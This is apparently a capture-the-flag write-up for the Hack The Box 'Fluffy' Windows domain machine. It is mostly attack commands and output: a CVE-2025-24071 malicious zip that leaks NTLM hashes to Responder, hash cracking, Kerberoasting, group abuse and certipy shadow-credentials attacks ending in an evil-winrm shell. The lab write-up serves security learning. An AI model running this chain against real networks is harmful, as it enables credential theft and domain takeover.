---
title: Fluffy [Easy]
date: 2025-05-27
tags: [htb, windows, shadow credentials, certificate services, certipy, CVE-2025-24071, clock skew, evil-winrm, nmap, AD, password cracking, responder, smbmap, smbclient, impacket tools]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/fluffy-htb-season8
image: /assets/img/fluffy-htb-season8/fluffy-htb-season8_banner.png
---

# Fluffy HTB Season 8
## Machine information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / `J0elTHEM4n1990!`. <br>
Author: [ruycr4ft](https://app.hackthebox.com/users/1253217) and [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 04:28 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.20s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 15:08:15Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T15:09:40+00:00; +6h38m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T15:09:41+00:00; +6h38m55s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T15:09:40+00:00; +6h38m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T15:09:41+00:00; +6h38m55s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h38m54s, deviation: 0s, median: 6h38m54s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-26T15:09:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.67 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx fluffy.htb DC01.fluffy.htb
```

### Enum users
```bash
└─$ sudo crackmapexec smb 10.129.xx.xx -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [+] Enumerated domain user(s)
SMB         10.10.11.69     445    DC01             fluffy.htb\j.fleischman                   badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\j.coffey                       badpwdcount: 25 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\winrm_svc                      badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\p.agila                        badpwdcount: 25 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\ldap_svc                       badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\ca_svc                         badpwdcount: 0 desc: 
SMB         10.10.11.69     445    DC01             fluffy.htb\krbtgt                         badpwdcount: 26 desc: Key Distribution Center Service Account
SMB         10.10.11.69     445    DC01             fluffy.htb\Guest                          badpwdcount: 68 desc: Built-in account for guest access to the computer/domain
SMB         10.10.11.69     445    DC01             fluffy.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

```bash
└─$ cat users.txt 
Administrator
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

### SMB
```bash
└─$ smbmap -H fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'                                                                                                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.xx.xx:445 Name: fluffy.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

```bash
└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.xx.xx/IT
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May 19 10:27:02 2025
  ..                                  D        0  Mon May 19 10:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1399975 blocks available
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (118.8 KiloBytes/sec) (average 118.8 KiloBytes/sec)
```

Check the PDF file.

![PDF](/assets/img/fluffy-htb-season8/fluffy-htb-season8_pdf.png)

See a list of CVE from the IT Department. Google for these CVEs. <br>
&rarr; Found this [CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071)

### CVE-2025-24071
Look at the `Overview` section.

![CVE-2025-24071](/assets/img/fluffy-htb-season8/fluffy-htb-season8_cve-2025-24071.png)

They told us how to exploit this vulnerability. Let's go for it.

```bash
└─$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git

└─$ python3 CVE-2025-24071/exploit.py -i 10.129.xx.xx -f reverse                                                                                                                                                                                        

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    
Creating exploit with filename: reverse.library-ms
Target IP: 10.129.xx.xx

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Now turn on `Responder` to capture the NTLM hash.
```bash
└─$ sudo responder -I tun0           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.129.xx.xx]
    Responder IPv6             [dead:beef:2::101e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1E2RNILMEJM]
    Responder Domain Name      [T0TF.LOCAL]
    Responder DCE-RPC Port     [49784]

[+] Listening for events...
```

Upload the `exploit.zip` throught `smbclient`.
```bash
─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.xx.xx/IT
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (4.2 kb/s) (average 4.2 kb/s)
smb: \> ls
  .                                   D        0  Mon May 26 12:40:13 2025
  ..                                  D        0  Mon May 26 12:40:13 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      322  Mon May 26 12:40:13 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1469211 blocks available
```

BOOM!, we got the NTLM hash from `p.agila`.

```bash
[SMB] NTLMv2-SSP Client   : 10.129.xx.xx
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c31d0cfd5bb68750:1C2C7DB44EBE7C3F93DEADAB46D1B85C:<SNIP>
```

### Cracking
Just `echo` the hash to a file and crack it with `john`.
```bash
└─$ echo "p.agila::FLUFFY:c31d0cfd5bb68750:1C2C7DB44EBE7C3F93DEADAB46D1B85C:<SNIP>" > pagila.hash

└─$ john pagila.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusxxxxx  (p.agila)     
1g 0:00:00:07 DONE (2025-05-26 05:43) 0.1278g/s 577735p/s 577735c/s 577735C/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Got the password `prometheusxxxxx`. Double check with `crackmapexec`.
```bash
└─$ sudo crackmapexec smb fluffy.htb -u 'p.agila' -p 'prometheusxxxxx'                
SMB         fluffy.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         fluffy.htb      445    DC01             [+] fluffy.htb\p.agila:prometheusxxxxx
```
## Initial Access
Let's `winrm` as there is a open port `5985`.
```text
└─$ evil-winrm -i 10.129.xx.xx -u 'p.agila' -p 'prometheusxxxxx'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Can not connect with `winrm`. Let's check for bloodhound from user `j.fleischman`.

### Bloodhound
```bash
└─$ bloodhound-python -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d fluffy.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 07S
```

Upload the `bloodhound_results.json` to `bloodhound`.

![Bloodhound](/assets/img/fluffy-htb-season8/fluffy-htb-season8_bloodhound.png)

So `p.agila` is a member of `SERVICE ACCOUNT MANAGERS@FLUFFY.HTB` and has a **GenericAll** to `SERVICE ACCOUNTS@FLUFFY.HTB`.

&rarr; We can add `p.agila` to `SERVICE ACCOUNTS@FLUFFY.HTB` group to exploit further more credentials.

```bash
└─$ bloodyAD --host 10.129.xx.xx -d fluffy.htb -u 'p.agila' -p 'prometheusxxxxx' add groupMember 'Service Accounts' p.agila 
[+] p.agila added to Service Accounts
```

> Ok but what to enumerate next?

Check again the `bloodhound` graph.

![Bloodhound](/assets/img/fluffy-htb-season8/fluffy-htb-season8_bloodhound2.png)

Found out `ca_svc` has this interesting part `CN=CERTIFICATE AUTHORITY SERVICE,CN=USERS,DC=FLUFFY,DC=HTB`. I google for it and found a blog post exploit by [0xdf](https://www.twitter.com/0xdf_).

![0xdf](/assets/img/fluffy-htb-season8/fluffy-htb-season8_0xdf.png)

I got through the writeup machine `Authority` and saw this part.

![Authority](/assets/img/fluffy-htb-season8/fluffy-htb-season8_authority.png)

So we need to enumerate ADCS also, there is also 2 machines `Escape` and `Absolute`, I go through the `Escape` machine and found out that port `3269` for `ssl/ldap` and `Oxdf` has discussed deep into [TLS Certificate](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#tls-certificate) and also this part [Shell as administrator](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#shell-as-administrator) and we will use this concept for our machine.

### Kerberos
Also I saw from the `Nmap` result.
```bash
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 15:08:15Z)
```

Check [The Hacker Recipes](https://www.thehacker.recipes/) and found out more way to exploit with [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) which is pretty cool, let's go for this one.

```bash
└─$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.129.xx.xx 'fluffy.htb/p.agila:prometheusxxxxx'         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Hmm, `Clock skew too great` and we can see that we can definitely get the `krbtgt` hash for `ca_svc`, `ldap_svc`, `winrm_svc`.
&rarr; Let's research for solve this `Clock skew too great` issue.

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew.png)

Okay so these problem pratical happens when different timezones between the attacker and the target. Check this [forum](https://forum.hackthebox.com/t/how-do-you-synchronize-ad-and-time/318340) and [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html).

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew2.png)

![Clock skew](/assets/img/fluffy-htb-season8/fluffy-htb-season8_clock-skew3.png)

&rarr; We need to `sudo rdate -n <target-ip>` to sync the time.

```bash
└─$ sudo rdate -n 10.129.xx.xx
Mon May 26 17:02:32 EDT 2025
```

Now let's try to get the `krbtgt` hash.
```bash
└─$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.129.xx.xx 'fluffy.htb/p.agila:prometheusxxxxx'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
```

```bash
└─$ cat kerberoastables.txt 
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$8c4fcdc5f7454b39a1efd4d0609da23d$<SNIP>
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$ba7e6edd4090a73471001b7746dd4fe1$<SNIP>
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$ba0dfa0d95771f5999106aea373e2521$<SNIP>
```

Got `krb5tgs` for 3 more accounts. Let's cracking it.

```bash
└─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:25 DONE (2025-05-26 17:13) 0g/s 168432p/s 505298c/s 505298C/s !!12Honey..*7¡Vamos!
Session completed.
```

Unable to crack :((. Let's go back to the approach we discussed from `0xdf` blog and using [Certipy](https://github.com/ly4k/Certipy) which is the tool for Active Directory Certificate Services enumeration and abuse.

## Privilege Escalation
### Active Directory Certificate Services (AD CS)
Let's use `find` to identify templates and `-vulnerable` to show the vulnerable result only.
```bash
└─$ certipy find -u p.agila -p 'prometheusxxxxx' -target fluffy.htb -text -stdout -vulnerable 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

> Double check to update `certipy` to newest version `v5.0.2`.

As we can see there is not certificate services vulnerable, but when we look back at the bloodhound graph, our user `p.agila` has been added to `SERVICE ACCOUNTS@FLUFFY.HTB` group which has `ca_svc`, `ldap_svc` member and this group also has **GenericWrite** to `winrm_svc` user.

With `certipy`, we can use `shadow credentials` attack to get `NT HASH` from `ca_svc`. Let's start this part first!
```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusxxxxx' -account ca_svc                                        
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff'
[*] Adding Key Credential with device ID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': <SNIP>
```

Got the `NT hash` for `ca_svc` so typically, we can grab `NT hash` for `ldap_svc` and even `winrm_svc`.

```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusxxxxx' -account 'ldap_svc'                                                                                   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c071415b-aafc-32b8-9254-a5803f1a2cba'
[*] Adding Key Credential with device ID 'c071415b-aafc-32b8-9254-a5803f1a2cba' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID 'c071415b-aafc-32b8-9254-a5803f1a2cba' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': <SNIP>
```

```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusxxxxx' -account 'winrm_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba'
[*] Adding Key Credential with device ID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': <SNIP>
```

*During your process, if you can and got this problem:*
```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusxxxxx' -account 'winrm_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fd934af8-0516-f562-b912-1c32ea64e9d2'
[*] Adding Key Credential with device ID 'fd934af8-0516-f562-b912-1c32ea64e9d2' to the Key Credentials for 'winrm_svc'
[-] Could not update Key Credentials for 'winrm_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

&rarr; Just run again the `add groupMember` for `p.agila` and the result will good to go. (In case, update the **timezones** too)

```text
└─$ evil-winrm -i 10.129.xx.xx -u 'winrm_svc' -H '<SNIP>'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
